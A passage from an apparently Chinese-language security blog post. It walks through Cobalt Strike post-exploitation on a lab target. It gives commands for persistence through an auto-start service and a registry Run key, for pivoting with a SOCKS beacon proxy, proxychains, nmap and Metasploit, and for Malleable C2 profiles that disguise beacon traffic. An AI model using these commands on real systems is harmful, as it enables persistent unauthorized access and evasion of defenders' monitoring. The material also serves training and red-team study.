alt="image-20200628211758573"></p><p>设置服务的描述字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc description &quot;server power&quot; &quot;description&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628211849270.png" alt></p><p> 设置服务为自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc config &quot;server power&quot; start&#x3D; auto</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628211945427.png" alt="image-20200628211945427"></p><p>在靶机的服务中可以看到server power的项</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628212055324.png" alt="image-20200628212055324"></p><p> 然后启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net start &quot;server power&quot;</span><br></pre></td></tr></table></figure><p>此时注意到又拿了一个beacon</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628212123186.png" alt="image-20200628212123186"></p><p> 接下来还是重启靶机,重新获取控制。</p><p><strong>三、直接写注册表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &quot;keyname&quot; &#x2F;t REG_SZ &#x2F;d &quot;C:\Windows\artifact.exe&quot; &#x2F;f</span><br></pre></td></tr></table></figure><h2 id="代理与C2"><a href="#代理与C2" class="headerlink" title="代理与C2"></a>代理与C2</h2><h4 id="代理和powershell"><a href="#代理和powershell" class="headerlink" title="代理和powershell"></a>代理和powershell</h4><p>代理（Proxy）也称网络代理，是一种特殊的网络服务，允许一个网络终端（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。</p><p>在已拿到beacon情况下：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628223544318.png" alt="image-20200628223544318"></p><p><strong>利用socks代理客户端直接把各类渗透工具带进目标进网：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在beacon shell中输入socks 1234,1234为端口，我们可以随意设置，只要不冲突就行.</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628223827031.png" alt></p><p>接下来可以使用proxychains,它是一个开源代理工具，能够强制使任何应用的TCP连接使用SOCKS4,SOCKS或者HTTP(S)代理进行连接。</p><p>ProxyChains运行的所有配置都在/etc/proxychains.conf中，我们需要在这个文件中进行设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">在最后一行输入sosks4  127.0.0.1  1234</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628224029301.png" alt="image-20200628224029301"></p><p> 设置好后，我们来看看proxychains使用代理访问的情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令形式为：proxychains &lt;运行的命令&gt; &lt;命令参数&gt;</span><br></pre></td></tr></table></figure><p>比如我们可以把nmap代理到内网使用，用来扫描内网存活的主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在beaconshell中查看靶机ip</span><br><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628224233528.png" alt></p><p>接下来就把nmap代理到这个网段进行扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sP 172.16.12.0&#x2F;24</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628224559889.png" alt="image-20200628224559889"></p><p>把其他工具代理到内网也是一样的道理。</p><p>把msf代理到内网可以使用这种办法，也可以直接利用隧道把整个msf带进目标内网：</p><p>点击cs菜单上的view-&gt;proxy pivots，可以看到代理情况</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628224734881.png" alt="image-20200628224734881"></p><p>然后点击下方的tunnel，复制命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:172.16.12.137:1234</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628224839575.png" alt="image-20200628224839575"></p><p>启动msf</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628225004839.png" alt="image-20200628225004839"></p><p>  把上一步复制的命令粘贴进来</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628225146945.png" alt="image-20200628225146945"></p><p> 这样就把msf代理到内网中去了，接下来就可以使用msf对内网中的机器进行渗透。</p><h4 id="MallelableC2配置与使用"><a href="#MallelableC2配置与使用" class="headerlink" title="MallelableC2配置与使用"></a>MallelableC2配置与使用</h4><p>Malleable C2就是Malleable Command and Control，Beacon中的http通讯由Malleable-C2配置文件控制，在启动teamserver时来指定我们的配置文件，每个CS实例只能载入一个配置文件。用CobaltStrike的 Malleable-C2-Profiles伪装流量，让我们的通讯更加隐蔽。</p><p>前提已拿到靶机beacon</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628225757408.png" alt="image-20200628225757408"></p><p>使用科来专家增强版对虚拟机网络进行抓包</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628225923211.png" alt="image-20200628225923211"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200628231335956.png" alt="image-20200628231335956"></p><p>使用CobaltStrike的 Malleable-C2-Profiles伪装流量， Beacon中的http通讯由Malleable-C2配置文件控制，在启动teamserver时来指定我们的配置文件,每个CS只能载入一个配置文件。其中目录下的 c2lint 文件可以检测配置文件的语法问题和测试。</p><p>github上的Malleable-C2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;Malleable-C2-Profiles</span><br></pre></td></tr></table></figure><p>使用时的语法如下所示，即在启动teamserver时在最后指定profile的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver  172.16.12.137  password  &#x2F;root&#x2F;cs&#x2F;Malleable-C2-Profiles-master&#x2F;normalicrosoftupdate_getonly.profile</span><br></pre></td></tr></table></figure><p>再次抓包发现，已伪装成功</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628232750307.png" alt="image-20200628232750307"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Cobaltstrike" scheme="http://yoursite.com/tags/Cobaltstrike/"/>
    
  </entry>
  
</feed>
